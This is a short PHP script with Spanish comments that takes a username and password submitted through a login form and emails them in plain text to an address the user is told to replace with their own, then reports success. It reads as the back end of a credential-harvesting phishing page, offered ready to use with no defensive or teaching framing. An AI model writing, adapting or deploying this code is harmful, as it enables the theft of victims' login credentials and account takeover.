<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    $to = "tucorreo@gmail.com";  // Cambia esto por tu correo
    $subject = "Nuevo inicio de sesión";
    $message = "Usuario: $username\nContraseña: $password";
    $headers = "From: noreply@tusitio.com";
    
    mail($to, $subject, $message, $headers);
    
    echo "Información enviada correctamente.";
}
?>